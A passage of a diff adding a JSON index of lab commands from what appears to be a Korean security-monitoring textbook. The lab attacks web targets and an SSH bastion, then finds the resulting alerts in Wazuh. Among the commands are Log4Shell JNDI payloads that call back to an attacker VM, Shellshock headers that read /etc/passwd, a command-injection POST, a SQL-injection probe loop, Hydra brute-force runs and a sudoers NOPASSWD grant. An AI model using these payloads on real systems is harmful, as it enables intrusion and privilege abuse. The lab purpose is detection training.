+    "file": "examples/rev02/chapter07/Q07-09.txt",
+    "text": "agent.name: \"web\"\nAND (rule.id: \"31106\"\n OR (rule.groups: \"attack\" AND data.id: \"200\"))"
+  },
+  {
+    "document": "volume01-chapter07.json",
+    "section": "SQL 인젝션 경보의 500",
+    "id": "Q07-10",
+    "where": "Windows · Discover · wazuh-alerts-*",
+    "file": "examples/rev02/chapter07/Q07-10.txt",
+    "text": "agent.name: \"web\" AND data.id: 5*"
+  },
+  {
+    "document": "volume01-chapter07.json",
+    "section": "반복 오류 규칙과 대응",
+    "id": "Q07-11",
+    "where": "Windows · Discover · wazuh-alerts-*",
+    "file": "examples/rev02/chapter07/Q07-11.txt",
+    "text": "agent.name: \"web\"\nAND rule.id: (31161 OR 31162 OR 31163)"
+  },
+  {
+    "document": "volume01-chapter07.json",
+    "section": "7.8  로그와 설정의 원본 위치",
+    "id": "C07-14",
+    "where": "kt66 VM · 터미널",
+    "file": "examples/rev02/chapter07/C07-14.txt",
+    "text": "docker exec -it kt66-web /bin/bash"
+  },
+  {
+    "document": "volume01-chapter07.json",
+    "section": "7.8  로그와 설정의 원본 위치",
+    "id": "C07-15",
+    "where": "kt66-web · 컨테이너 셸",
+    "file": "examples/rev02/chapter07/C07-15.txt",
+    "text": "grep -n -F 'shell.php' \\\n  /var/log/apache2/landing_access.log"
+  },
+  {
+    "document": "volume01-chapter07.json",
+    "section": "7.8  로그와 설정의 원본 위치",
+    "id": "C07-16",
+    "where": "kt66-web · 컨테이너 셸",
+    "file": "examples/rev02/chapter07/C07-16.txt",
+    "text": "grep -n -E 'ServerName|DocumentRoot|ProxyPass|SecRuleEngine' \\\n  /etc/apache2/sites-enabled/*.conf"
+  },
+  {
+    "document": "volume01-chapter07.json",
+    "section": "감사 기록과 앱 처리기 조회",
+    "id": "C07-17",
+    "where": "kt66-web · 컨테이너 셸",
+    "file": "examples/rev02/chapter07/C07-17.txt",
+    "text": "tail -n 5 /var/log/apache2/modsec_audit.log"
+  },
+  {
+    "document": "volume01-chapter07.json",
+    "section": "감사 기록과 앱 처리기 조회",
+    "id": "C07-18",
+    "where": "kt66-web · 컨테이너 셸",
+    "file": "examples/rev02/chapter07/C07-18.txt",
+    "text": "exit"
+  },
+  {
+    "document": "volume01-chapter07.json",
+    "section": "감사 기록과 앱 처리기 조회",
+    "id": "C07-19",
+    "where": "kt66 VM · 터미널",
+    "file": "examples/rev02/chapter07/C07-19.txt",
+    "text": "docker exec -it kt66-dvwa /bin/bash"
+  },
+  {
+    "document": "volume01-chapter07.json",
+    "section": "감사 기록과 앱 처리기 조회",
+    "id": "C07-20",
+    "where": "kt66-dvwa · 컨테이너 셸",
+    "file": "examples/rev02/chapter07/C07-20.txt",
+    "text": "cat /var/www/html/vulnerabilities/exec/source/low.php"
+  },
+  {
+    "document": "volume01-chapter07.json",
+    "section": "감사 기록과 앱 처리기 조회",
+    "id": "C07-21",
+    "where": "kt66-dvwa · 컨테이너 셸",
+    "file": "examples/rev02/chapter07/C07-21.txt",
+    "text": "exit"
+  },
+  {
+    "document": "volume01-chapter07.json",
+    "section": "Manager의 규칙 정의 조회",
+    "id": "C07-22",
+    "where": "kt66 VM · 터미널",
+    "file": "examples/rev02/chapter07/C07-22.txt",
+    "text": "docker exec -it kt66-siem /bin/bash"
+  },
+  {
+    "document": "volume01-chapter07.json",
+    "section": "Manager의 규칙 정의 조회",
+    "id": "C07-23",
+    "where": "kt66-siem · 컨테이너 셸",
+    "file": "examples/rev02/chapter07/C07-23.txt",
+    "text": "grep -n -A 16 -F 'id=\"31106\"' \\\n  /var/ossec/ruleset/rules/0245-web_rules.xml"
+  },
+  {
+    "document": "volume01-chapter07.json",
+    "section": "7.9  curl 요청 실습(선택)",
+    "id": "C07-24",
+    "where": "공격자 VM · 터미널",
+    "file": "examples/rev02/chapter07/C07-24.txt",
+    "text": "curl --version"
+  },
+  {
+    "document": "volume01-chapter07.json",
+    "section": "JNDI 헤더와 URL",
+    "id": "C07-25",
+    "where": "공격자 VM · 터미널",
+    "file": "examples/rev02/chapter07/C07-25.txt",
+    "text": "curl -i --max-time 15 --get \\\n  -A '${jndi:ldap://192.168.0.108:1389/a}' \\\n  --data-urlencode \\\n  'q=${jndi:ldap://192.168.0.108:1389/a}' \\\n  http://dvwa.ccc.com/"
+  },
+  {
+    "document": "volume01-chapter07.json",
+    "section": "JNDI 변형 헤더",
+    "id": "C07-26",
+    "where": "공격자 VM · 터미널",
+    "file": "examples/rev02/chapter07/C07-26.txt",
+    "text": "curl -i --max-time 15 \\\n  -H \\\n'X-Api-Version: ${${lower:j}ndi:ldap://192.168.0.108:1389/b}' \\\n  -A '${jndi:rmi://192.168.0.108:1099/c}' \\\n  http://dvwa.ccc.com/"
+  },
+  {
+    "document": "volume01-chapter07.json",
+    "section": "Shellshock의 두 헤더",
+    "id": "C07-27",
+    "where": "공격자 VM · 터미널",
+    "file": "examples/rev02/chapter07/C07-27.txt",
+    "text": "curl -i --max-time 15 \\\n  -A '() { :; }; /bin/bash -c \"id\"' \\\n  http://juice.ccc.com/cgi-bin/test.cgi"
+  },
+  {
+    "document": "volume01-chapter07.json",
+    "section": "Shellshock의 두 헤더",
+    "id": "C07-28",
+    "where": "공격자 VM · 터미널",
+    "file": "examples/rev02/chapter07/C07-28.txt",
+    "text": "curl -i --max-time 15 \\\n  -H 'Referer: () { :; }; /bin/bash -c \"cat /etc/passwd\"' \\\n  http://dvwa.ccc.com/cgi-bin/status"
+  },
+  {
+    "document": "volume01-chapter07.json",
+    "section": "POST 본문과 인증 상태",
+    "id": "C07-29",
+    "where": "공격자 VM · 터미널",
+    "file": "examples/rev02/chapter07/C07-29.txt",
+    "text": "curl -i --max-time 15 \\\n  --data 'ip=127.0.0.1;id&Submit=Submit' \\\n  http://dvwa.ccc.com/vulnerabilities/exec/"
+  },
+  {
+    "document": "volume01-chapter07.json",
+    "section": "원본 반복문의 구문",
+    "id": "C07-30",
+    "where": "공격자 VM · 터미널",
+    "file": "examples/rev02/chapter07/C07-30.txt",
+    "text": "for i in $(seq 1 20); do\n  curl -sS --max-time 15 -o /dev/null \\\n    -w \"%{http_code} \" \\\n    \"http://juice.ccc.com/rest/products/search?q=%27$i\"\ndone\nprintf \"\\n\""
+  },
+  {
+    "document": "volume01-chapter08.json",
+    "section": "컨테이너와 수집 상태 확인",
+    "id": "C08-01",
+    "where": "Windows · 터미널",
+    "file": "examples/rev02/chapter08/C08-01.txt",
+    "text": "ssh ccc@192.168.0.107"
+  },
+  {
+    "document": "volume01-chapter08.json",
+    "section": "컨테이너와 수집 상태 확인",
+    "id": "C08-02",
+    "where": "kt66 VM · ccc 호스트 셸",
+    "file": "examples/rev02/chapter08/C08-02.txt",
+    "text": "docker ps\ndocker port kt66-bastion"
+  },
+  {
+    "document": "volume01-chapter08.json",
+    "section": "컨테이너와 수집 상태 확인",
+    "id": "C08-03",
+    "where": "kt66 VM · ccc 호스트 셸",
+    "file": "examples/rev02/chapter08/C08-03.txt",
+    "text": "docker exec -it kt66-bastion /bin/bash"
+  },
+  {
+    "document": "volume01-chapter08.json",
+    "section": "서버의 초기 상태 기록",
+    "id": "C08-04",
+    "where": "kt66-bastion · root 셸",
+    "file": "examples/rev02/chapter08/C08-04.txt",
+    "text": "hostname\n/usr/sbin/sshd -T | grep -E \\\n'^(port|permitrootlogin|passwordauthentication|maxauthtries) '"
+  },
+  {
+    "document": "volume01-chapter08.json",
+    "section": "서버의 초기 상태 기록",
+    "id": "C08-05",
+    "where": "kt66-bastion · root 셸",
+    "file": "examples/rev02/chapter08/C08-05.txt",
+    "text": "passwd -S root\n/var/ossec/bin/wazuh-control status\ntail -n 10 /var/log/auth.log"
+  },
+  {
+    "document": "volume01-chapter08.json",
+    "section": "공격자 VM에 Hydra 준비",
+    "id": "C08-06",
+    "where": "Windows · 별도 터미널",
+    "file": "examples/rev02/chapter08/C08-06.txt",
+    "text": "ssh att@192.168.0.108"
+  },
+  {
+    "document": "volume01-chapter08.json",
+    "section": "공격자 VM에 Hydra 준비",
+    "id": "C08-07",
+    "where": "공격자 VM · att 셸",
+    "file": "examples/rev02/chapter08/C08-07.txt",
+    "text": "command -v ssh\ncommand -v hydra"
+  },
+  {
+    "document": "volume01-chapter08.json",
+    "section": "공격자 VM에 Hydra 준비",
+    "id": "C08-08",
+    "where": "공격자 VM · att 셸",
+    "file": "examples/rev02/chapter08/C08-08.txt",
+    "text": "sudo apt-get update\nsudo apt-get install -y hydra\nhydra -h"
+  },
+  {
+    "document": "volume01-chapter08.json",
+    "section": "목록 파일과 정상 로그인 준비",
+    "id": "C08-09",
+    "where": "공격자 VM · att 셸",
+    "file": "examples/rev02/chapter08/C08-09.txt",
+    "text": "ls -ld ~/book08"
+  },
+  {
+    "document": "volume01-chapter08.json",
+    "section": "목록 파일과 정상 로그인 준비",
+    "id": "C08-10",
+    "where": "공격자 VM · att 셸",
+    "file": "examples/rev02/chapter08/C08-10.txt",
+    "text": "mkdir ~/book08\ncd ~/book08\npwd"
+  },
+  {
+    "document": "volume01-chapter08.json",
+    "section": "목록 파일과 정상 로그인 준비",
+    "id": "C08-11",
+    "where": "공격자 VM · att 셸",
+    "file": "examples/rev02/chapter08/C08-11.txt",
+    "text": "ssh -p 2204 -o HostKeyAlgorithms=ssh-ed25519 \\\n  ccc@192.168.0.107"
+  },
+  {
+    "document": "volume01-chapter08.json",
+    "section": "서버 확인과 정상 인증 기록",
+    "id": "C08-12",
+    "where": "kt66-bastion · root 셸",
+    "file": "examples/rev02/chapter08/C08-12.txt",
+    "text": "ssh-keygen -lf \\\n/var/lib/bastion/ssh-host-keys/ssh_host_ed25519_key.pub"
+  },
+  {
+    "document": "volume01-chapter08.json",
+    "section": "서버 확인과 정상 인증 기록",
+    "id": "C08-13",
+    "where": "kt66-bastion · SSH로 접속한 ccc 셸",
+    "file": "examples/rev02/chapter08/C08-13.txt",
+    "text": "hostname\nwhoami\nid\nexit"
+  },
+  {
+    "document": "volume01-chapter08.json",
+    "section": "서버 확인과 정상 인증 기록",
+    "id": "C08-14",
+    "where": "kt66-bastion · root 셸",
+    "file": "examples/rev02/chapter08/C08-14.txt",
+    "text": "tail -n 20 /var/log/auth.log"
+  },
+  {
+    "document": "volume01-chapter08.json",
+    "section": "Discover에서 인증 로그 검색",
+    "id": "Q08-01",
+    "where": "Windows · Discover · wazuh-alerts-*",
+    "file": "examples/rev02/chapter08/Q08-01.txt",
+    "text": "agent.name: \"bastion\" AND\nlocation: \"/var/log/auth.log\""
+  },
+  {
+    "document": "volume01-chapter08.json",
+    "section": "8.2  동일 계정의 암호 대입",
+    "id": "C08-15",
+    "where": "공격자 VM · att 셸",
+    "file": "examples/rev02/chapter08/C08-15.txt",
+    "text": "cd ~/book08\nls -l pw-fail.txt"
+  },
+  {
+    "document": "volume01-chapter08.json",
+    "section": "8.2  동일 계정의 암호 대입",
+    "id": "C08-16",
+    "where": "공격자 VM · att 셸",
+    "file": "examples/rev02/chapter08/C08-16.txt",
+    "text": "printf '%s\\n' \\\nbook08-wrong01 book08-wrong02 book08-wrong03 \\\nbook08-wrong04 book08-wrong05 book08-wrong06 \\\nbook08-wrong07 book08-wrong08 book08-wrong09 \\\nbook08-wrong10 book08-wrong11 book08-wrong12 \\\n> pw-fail.txt\ncat pw-fail.txt\nwc -l pw-fail.txt"
+  },
+  {
+    "document": "volume01-chapter08.json",
+    "section": "인증 시도와 응답 분석",
+    "id": "C08-17",
+    "where": "공격자 VM · att 셸",
+    "file": "examples/rev02/chapter08/C08-17.txt",
+    "text": "timeout 45s hydra -l ccc -P pw-fail.txt \\\n-t 4 -w 5 ssh://192.168.0.107:2204"
+  },
+  {
+    "document": "volume01-chapter08.json",
+    "section": "인증 시도와 응답 분석",
+    "id": "Q08-02",
+    "where": "Windows · Discover · wazuh-alerts-*",
+    "file": "examples/rev02/chapter08/Q08-02.txt",
+    "text": "agent.name: \"bastion\" AND\n(rule.id: \"5760\" OR rule.id: \"5763\")"
+  },
+  {
+    "document": "volume01-chapter08.json",
+    "section": "반복 로그 요약과 필드 누락",
+    "id": "Q08-03",
+    "where": "Windows · Discover · wazuh-alerts-*",
+    "file": "examples/rev02/chapter08/Q08-03.txt",
+    "text": "agent.name: \"bastion\" AND\nfull_log: \"message repeated\""
+  },
+  {
+    "document": "volume01-chapter08.json",
+    "section": "자동 대응의 실행 여부 확인",
+    "id": "C08-18",
+    "where": "kt66-bastion · root 셸",
+    "file": "examples/rev02/chapter08/C08-18.txt",
+    "text": "tail -n 25 /var/ossec/logs/active-responses.log\niptables -S"
+  },
+  {
+    "document": "volume01-chapter08.json",
+    "section": "8.3  존재하지 않는 계정의 인증 시도",
+    "id": "C08-19",
+    "where": "kt66-bastion · root 셸",
+    "file": "examples/rev02/chapter08/C08-19.txt",
+    "text": "getent passwd book08-none1\ngetent passwd book08-none2\ngetent passwd book08-none3"
+  },
+  {
+    "document": "volume01-chapter08.json",
+    "section": "8.3  존재하지 않는 계정의 인증 시도",
+    "id": "C08-20",
+    "where": "공격자 VM · att 셸",
+    "file": "examples/rev02/chapter08/C08-20.txt",
+    "text": "cd ~/book08\nls -l users-invalid.txt\nprintf '%s\\n' book08-none1 book08-none2 \\\nbook08-none3 > users-invalid.txt\ncat users-invalid.txt"
+  },
+  {
+    "document": "volume01-chapter08.json",
+    "section": "잘못된 계정의 응답과 경보",
+    "id": "C08-21",
+    "where": "공격자 VM · att 셸",
+    "file": "examples/rev02/chapter08/C08-21.txt",
+    "text": "timeout 30s hydra -L users-invalid.txt \\\n-p book08-wrong -t 3 -w 5 \\\nssh://192.168.0.107:2204"
+  },
+  {
+    "document": "volume01-chapter08.json",
+    "section": "잘못된 계정의 응답과 경보",
+    "id": "Q08-04",
+    "where": "Windows · Discover · wazuh-alerts-*",
+    "file": "examples/rev02/chapter08/Q08-04.txt",
+    "text": "agent.name: \"bastion\" AND\n(rule.id: \"5710\" OR rule.id: \"5712\")"
+  },
+  {
+    "document": "volume01-chapter08.json",
+    "section": "8.4  인증 실패 이후의 성공 기록",
+    "id": "C08-22",
+    "where": "공격자 VM · att 셸",
+    "file": "examples/rev02/chapter08/C08-22.txt",
+    "text": "cd ~/book08\nls -l pw-success.txt\nprintf '%s\\n' book08-bad1 book08-bad2 \\\nbook08-bad3 ccc > pw-success.txt\ncat pw-success.txt"
+  },
+  {
+    "document": "volume01-chapter08.json",
+    "section": "8.4  인증 실패 이후의 성공 기록",
+    "id": "C08-23",
+    "where": "공격자 VM · att 셸",
+    "file": "examples/rev02/chapter08/C08-23.txt",
+    "text": "timeout 35s hydra -l ccc -P pw-success.txt \\\n-t 1 -w 5 -f ssh://192.168.0.107:2204"
+  },
+  {
+    "document": "volume01-chapter08.json",
+    "section": "성공 뒤 셸과 기록 확인",
+    "id": "C08-24",
+    "where": "공격자 VM · att 셸",
+    "file": "examples/rev02/chapter08/C08-24.txt",
+    "text": "ssh -p 2204 ccc@192.168.0.107"
+  },
+  {
+    "document": "volume01-chapter08.json",
+    "section": "성공 뒤 셸과 기록 확인",
+    "id": "C08-25",
+    "where": "kt66-bastion · SSH로 접속한 ccc 셸",
+    "file": "examples/rev02/chapter08/C08-25.txt",
+    "text": "hostname\nwhoami\nid\nexit"
+  },
+  {
+    "document": "volume01-chapter08.json",
+    "section": "성공 뒤 셸과 기록 확인",
+    "id": "Q08-05",
+    "where": "Windows · Discover · wazuh-alerts-*",
+    "file": "examples/rev02/chapter08/Q08-05.txt",
+    "text": "agent.name: \"bastion\" AND\ndata.srcip: \"192.168.0.108\" AND\n(rule.id: \"5760\" OR rule.id: \"5715\")"
+  },
+  {
+    "document": "volume01-chapter08.json",
+    "section": "설정과 암호 상태 백업",
+    "id": "C08-26",
+    "where": "kt66-bastion · root 셸",
+    "file": "examples/rev02/chapter08/C08-26.txt",
+    "text": "ls -l /root/book08-sshd_config.before \\\n/root/book08-shadow.before\npasswd -S root"
+  },
+  {
+    "document": "volume01-chapter08.json",
+    "section": "설정과 암호 상태 백업",
+    "id": "C08-27",
+    "where": "kt66-bastion · root 셸",
+    "file": "examples/rev02/chapter08/C08-27.txt",
+    "text": "cp -p /etc/ssh/sshd_config \\\n/root/book08-sshd_config.before\ncp -p /etc/shadow /root/book08-shadow.before\nchmod 600 /root/book08-shadow.before"
+  },
+  {
+    "document": "volume01-chapter08.json",
+    "section": "설정과 암호 상태 백업",
+    "id": "C08-28",
+    "where": "kt66-bastion · root 셸",
+    "file": "examples/rev02/chapter08/C08-28.txt",
+    "text": "cmp /etc/ssh/sshd_config \\\n/root/book08-sshd_config.before\ncmp /etc/shadow /root/book08-shadow.before"
+  },
+  {
+    "document": "volume01-chapter08.json",
+    "section": "root 인증을 임시로 허용",
+    "id": "C08-29",
+    "where": "kt66-bastion · root 셸",
+    "file": "examples/rev02/chapter08/C08-29.txt",
+    "text": "vim /etc/ssh/sshd_config"
+  },
+  {
+    "document": "volume01-chapter08.json",
+    "section": "root 인증을 임시로 허용",
+    "id": "C08-30",
+    "where": "kt66-bastion · root 셸",
+    "file": "examples/rev02/chapter08/C08-30.txt",
+    "text": "passwd root"
+  },
+  {
+    "document": "volume01-chapter08.json",
+    "section": "유효 설정 검사와 재적용",
+    "id": "C08-31",
+    "where": "kt66-bastion · root 셸",
+    "file": "examples/rev02/chapter08/C08-31.txt",
+    "text": "/usr/sbin/sshd -t\n/usr/sbin/sshd -T -C \\\nuser=root,addr=192.168.0.108,host=attacker \\\n| grep -E '^(permitrootlogin|passwordauthentication) '"
+  },
+  {
+    "document": "volume01-chapter08.json",
+    "section": "유효 설정 검사와 재적용",
+    "id": "C08-32",
+    "where": "kt66-bastion · root 셸",
+    "file": "examples/rev02/chapter08/C08-32.txt",
+    "text": "service ssh reload\npasswd -S root"
+  },
+  {
+    "document": "volume01-chapter08.json",
+    "section": "직접 로그인과 Wazuh 확인",
+    "id": "C08-33",
+    "where": "공격자 VM · att 셸",
+    "file": "examples/rev02/chapter08/C08-33.txt",
+    "text": "ssh -p 2204 root@192.168.0.107"
+  },
+  {
+    "document": "volume01-chapter08.json",
+    "section": "직접 로그인과 Wazuh 확인",
+    "id": "Q08-06",
+    "where": "Windows · Discover · wazuh-alerts-*",
+    "file": "examples/rev02/chapter08/Q08-06.txt",
+    "text": "agent.name: \"bastion\" AND\nrule.id: \"5715\" AND data.dstuser: \"root\""
+  },
+  {
+    "document": "volume01-chapter08.json",
+    "section": "root 설정과 암호 원상복구",
+    "id": "C08-34",
+    "where": "kt66-bastion · root 셸",
+    "file": "examples/rev02/chapter08/C08-34.txt",
+    "text": "ls -l /root/book08-sshd_config.before \\\n/root/book08-shadow.before\ncp -p /root/book08-sshd_config.before \\\n/etc/ssh/sshd_config\ncp -p /root/book08-shadow.before /etc/shadow"
+  },
+  {
+    "document": "volume01-chapter08.json",
+    "section": "root 설정과 암호 원상복구",
+    "id": "C08-35",
+    "where": "kt66-bastion · root 셸",
+    "file": "examples/rev02/chapter08/C08-35.txt",
+    "text": "cmp /etc/ssh/sshd_config \\\n/root/book08-sshd_config.before\ncmp /etc/shadow /root/book08-shadow.before\n/usr/sbin/sshd -t\nservice ssh reload"
+  },
+  {
+    "document": "volume01-chapter08.json",
+    "section": "root 설정과 암호 원상복구",
+    "id": "C08-36",
+    "where": "kt66-bastion · root 셸",
+    "file": "examples/rev02/chapter08/C08-36.txt",
+    "text": "passwd -S root\n/usr/sbin/sshd -T | grep permitrootlogin"
+  },
+  {
+    "document": "volume01-chapter08.json",
+    "section": "복구 뒤 새 연결로 확인",
+    "id": "C08-37",
+    "where": "공격자 VM · att 셸",
+    "file": "examples/rev02/chapter08/C08-37.txt",
+    "text": "ssh -p 2204 -o NumberOfPasswordPrompts=1 \\\nroot@192.168.0.107"
+  },
+  {
+    "document": "volume01-chapter08.json",
+    "section": "복구 뒤 새 연결로 확인",
+    "id": "C08-38",
+    "where": "공격자 VM · att 셸",
+    "file": "examples/rev02/chapter08/C08-38.txt",
+    "text": "ssh -p 2204 ccc@192.168.0.107"
+  },
+  {
+    "document": "volume01-chapter08.json",
+    "section": "복구 뒤 새 연결로 확인",
+    "id": "C08-39",
+    "where": "kt66-bastion · root 셸",
+    "file": "examples/rev02/chapter08/C08-39.txt",
+    "text": "rm -i /root/book08-sshd_config.before \\\n/root/book08-shadow.before"
+  },
+  {
+    "document": "volume01-chapter08.json",
+    "section": "8.6  sudo 권한과 실행자 조사",
+    "id": "C08-40",
+    "where": "공격자 VM · att 셸",
+    "file": "examples/rev02/chapter08/C08-40.txt",
+    "text": "ssh -p 2204 ccc@192.168.0.107"
+  },
+  {
+    "document": "volume01-chapter08.json",
+    "section": "8.6  sudo 권한과 실행자 조사",
+    "id": "C08-41",
+    "where": "kt66-bastion · SSH로 접속한 ccc 셸",
+    "file": "examples/rev02/chapter08/C08-41.txt",
+    "text": "id\nsudo -l"
+  },
+  {
+    "document": "volume01-chapter08.json",
+    "section": "root 권한 명령 실행",
+    "id": "C08-42",
+    "where": "kt66-bastion · SSH로 접속한 ccc 셸",
+    "file": "examples/rev02/chapter08/C08-42.txt",
+    "text": "sudo -i id\nid"
+  },
+  {
+    "document": "volume01-chapter08.json",
+    "section": "root 권한 명령 실행",
+    "id": "C08-43",
+    "where": "kt66-bastion · SSH로 접속한 ccc 셸",
+    "file": "examples/rev02/chapter08/C08-43.txt",
+    "text": "ls -l /etc/shadow\nsudo cat /etc/shadow > /dev/null\necho $?"
+  },
+  {
+    "document": "volume01-chapter08.json",
+    "section": "sudo 원문과 필드 해석",
+    "id": "Q08-07",
+    "where": "Windows · Discover · wazuh-alerts-*",
+    "file": "examples/rev02/chapter08/Q08-07.txt",
+    "text": "agent.name: \"bastion\" AND\n(rule.id: \"5402\" OR rule.id: \"5403\")"
+  },
+  {
+    "document": "volume01-chapter08.json",
+    "section": "8.7  새 계정과 권한 변경 조사",
+    "id": "C08-44",
+    "where": "공격자 VM · att 셸",
+    "file": "examples/rev02/chapter08/C08-44.txt",
+    "text": "ssh -p 2204 ccc@192.168.0.107"
+  },
+  {
+    "document": "volume01-chapter08.json",
+    "section": "8.7  새 계정과 권한 변경 조사",
+    "id": "C08-45",
+    "where": "kt66-bastion · SSH로 접속한 ccc 셸",
+    "file": "examples/rev02/chapter08/C08-45.txt",
+    "text": "getent passwd book08-user\ngetent group book08-user\nls -ld /home/book08-user"
+  },
+  {
+    "document": "volume01-chapter08.json",
+    "section": "계정 생성과 암호 상태",
+    "id": "C08-46",
+    "where": "kt66-bastion · SSH로 접속한 ccc 셸",
+    "file": "examples/rev02/chapter08/C08-46.txt",
+    "text": "sudo useradd -m -s /bin/bash book08-user\ngetent passwd book08-user\nid book08-user\nsudo passwd -S book08-user"
+  },
+  {
+    "document": "volume01-chapter08.json",
+    "section": "계정 생성과 암호 상태",
+    "id": "Q08-08",
+    "where": "Windows · Discover · wazuh-alerts-*",
+    "file": "examples/rev02/chapter08/Q08-08.txt",
+    "text": "agent.name: \"bastion\" AND\nrule.id: \"5902\""
+  },
+  {
+    "document": "volume01-chapter08.json",
+    "section": "생성 필드와 그룹 추가",
+    "id": "C08-47",
+    "where": "kt66-bastion · SSH로 접속한 ccc 셸",
+    "file": "examples/rev02/chapter08/C08-47.txt",
+    "text": "sudo usermod -aG sudo book08-user\nid book08-user\ngetent group sudo"
+  },
+  {
+    "document": "volume01-chapter08.json",
+    "section": "실행 요청과 변경 결과 대조",
+    "id": "Q08-09",
+    "where": "Windows · Discover · wazuh-alerts-*",
+    "file": "examples/rev02/chapter08/Q08-09.txt",
+    "text": "agent.name: \"bastion\" AND\ndata.command: \"/usr/sbin/usermod -aG sudo book08-user\""
+  },
+  {
+    "document": "volume01-chapter08.json",
+    "section": "실행 요청과 변경 결과 대조",
+    "id": "C08-48",
+    "where": "kt66-bastion · SSH로 접속한 ccc 셸",
+    "file": "examples/rev02/chapter08/C08-48.txt",
+    "text": "sudo grep -F 'book08-user' /var/log/auth.log"
+  },
+  {
+    "document": "volume01-chapter08.json",
+    "section": "계정 삭제와 원상복구",
+    "id": "C08-49",
+    "where": "kt66-bastion · SSH로 접속한 ccc 셸",
+    "file": "examples/rev02/chapter08/C08-49.txt",
+    "text": "getent passwd book08-user\nid book08-user\nsudo userdel -r book08-user"
+  },
+  {
+    "document": "volume01-chapter08.json",
+    "section": "계정 삭제와 원상복구",
+    "id": "C08-50",
+    "where": "kt66-bastion · SSH로 접속한 ccc 셸",
+    "file": "examples/rev02/chapter08/C08-50.txt",
+    "text": "getent passwd book08-user\necho $?\ngetent group book08-user\necho $?\nls -ld /home/book08-user\ngetent group sudo"
+  },
+  {
+    "document": "volume01-chapter08.json",
+    "section": "삭제 기록의 계정 필드",
+    "id": "Q08-10",
+    "where": "Windows · Discover · wazuh-alerts-*",
+    "file": "examples/rev02/chapter08/Q08-10.txt",
+    "text": "agent.name: \"bastion\" AND\nrule.id: \"5903\""
+  },
+  {
+    "document": "volume01-chapter08.json",
+    "section": "수집 설정과 자동 대응 설정",
+    "id": "C08-51",
+    "where": "kt66-bastion · root 셸",
+    "file": "examples/rev02/chapter08/C08-51.txt",
+    "text": "grep -n -A 3 -B 2 '/var/log/auth.log' \\\n/var/ossec/etc/ossec.conf"
+  },
+  {
+    "document": "volume01-chapter08.json",
+    "section": "수집 설정과 자동 대응 설정",
+    "id": "C08-52",
+    "where": "bastion 관리 셸 → kt66 VM 호스트",
+    "file": "examples/rev02/chapter08/C08-52.txt",
+    "text": "exit\ndocker exec -it kt66-siem /bin/bash"
+  },
+  {
+    "document": "volume01-chapter08.json",
+    "section": "수집 설정과 자동 대응 설정",
+    "id": "C08-53",
+    "where": "kt66-siem · root 셸",
+    "file": "examples/rev02/chapter08/C08-53.txt",
+    "text": "grep -n -A 6 -B 2 '<command>firewall-drop' \\\n/var/ossec/etc/ossec.conf"
+  },
+  {
+    "document": "volume01-chapter08.json",
+    "section": "수집 설정과 자동 대응 설정",
+    "id": "C08-54",
+    "where": "kt66-siem · root 셸",
+    "file": "examples/rev02/chapter08/C08-54.txt",
+    "text": "exit"
+  },
+  {
+    "document": "volume01-chapter08.json",
+    "section": "실습 파일과 세션 원상복구",
+    "id": "C08-55",
+    "where": "공격자 VM · att 셸",
+    "file": "examples/rev02/chapter08/C08-55.txt",
+    "text": "cd ~/book08\npwd\nls -la"
+  },
+  {
+    "document": "volume01-chapter08.json",
+    "section": "실습 파일과 세션 원상복구",
+    "id": "C08-56",
+    "where": "공격자 VM · att 셸",
+    "file": "examples/rev02/chapter08/C08-56.txt",
+    "text": "rm -i pw-fail.txt users-invalid.txt pw-success.txt"
+  },
+  {
+    "document": "volume01-chapter09.json",
+    "section": "관리 창과 실습 창 준비",
+    "id": "C09-01",
+    "where": "Windows · 터미널",
+    "file": "examples/rev02/chapter09/C09-01.txt",
+    "text": "ssh ccc@192.168.0.107"
+  },
+  {
+    "document": "volume01-chapter09.json",
+    "section": "관리 창과 실습 창 준비",
+    "id": "C09-02",
+    "where": "kt66 VM · ccc 호스트 셸",
+    "file": "examples/rev02/chapter09/C09-02.txt",
+    "text": "docker ps\ndocker port kt66-bastion\ndocker exec -it kt66-bastion /bin/bash"
+  },
+  {
+    "document": "volume01-chapter09.json",
+    "section": "관리 창과 실습 창 준비",
+    "id": "C09-03",
+    "where": "kt66-bastion · root 관리 셸",
+    "file": "examples/rev02/chapter09/C09-03.txt",
+    "text": "hostname\n/var/ossec/bin/wazuh-control status\nvisudo -c"
+  },
+  {
+    "document": "volume01-chapter09.json",
+    "section": "관리 창과 실습 창 준비",
+    "id": "C09-04",
+    "where": "kt66-bastion · root 관리 셸",
+    "file": "examples/rev02/chapter09/C09-04.txt",
+    "text": "ls -l /etc/sudoers.d/ccc\ncat /etc/sudoers.d/ccc\nchmod 0440 /etc/sudoers.d/ccc\nvisudo -c"
+  },
+  {
+    "document": "volume01-chapter09.json",
+    "section": "관리 창과 실습 창 준비",
+    "id": "C09-05",
+    "where": "Windows · 별도 터미널",
+    "file": "examples/rev02/chapter09/C09-05.txt",
+    "text": "ssh att@192.168.0.108"
+  },
+  {
+    "document": "volume01-chapter09.json",
+    "section": "관리 창과 실습 창 준비",
+    "id": "C09-06",
+    "where": "공격자 VM · att 셸",
+    "file": "examples/rev02/chapter09/C09-06.txt",
+    "text": "ssh -p 2204 ccc@192.168.0.107\nhostname\nid"
+  },
+  {
+    "document": "volume01-chapter09.json",
+    "section": "파일 무결성 감시의 조건",
+    "id": "C09-07",
+    "where": "kt66-bastion · root 관리 셸",
+    "file": "examples/rev02/chapter09/C09-07.txt",
+    "text": "sed -n '/<syscheck>/,/<\\/syscheck>/p' \\\n/var/ossec/etc/ossec.conf"
+  },
+  {
+    "document": "volume01-chapter09.json",
+    "section": "9.2  sudo 권한 파일 변경",
+    "id": "C09-08",
+    "where": "kt66-bastion · SSH로 접속한 ccc 셸",
+    "file": "examples/rev02/chapter09/C09-08.txt",
+    "text": "sudo -l\nls -l /etc/sudoers.d/99-book09-lab"
+  },
+  {
+    "document": "volume01-chapter09.json",
+    "section": "9.2  sudo 권한 파일 변경",
+    "id": "C09-09",
+    "where": "kt66-bastion · SSH로 접속한 ccc 셸",
+    "file": "examples/rev02/chapter09/C09-09.txt",
+    "text": "printf '%s\\n' 'ccc ALL=(ALL) NOPASSWD:ALL' | \\\nsudo tee /etc/sudoers.d/99-book09-lab\nsudo chmod 0440 /etc/sudoers.d/99-book09-lab\nsudo visudo -cf /etc/sudoers.d/99-book09-lab\nsudo visudo -c"
+  },
+  {
+    "document": "volume01-chapter09.json",
+    "section": "추가와 수정 기록 구분",
+    "id": "Q09-01",
+    "where": "Windows · Discover · wazuh-alerts-*",
+    "file": "examples/rev02/chapter09/Q09-01.txt",
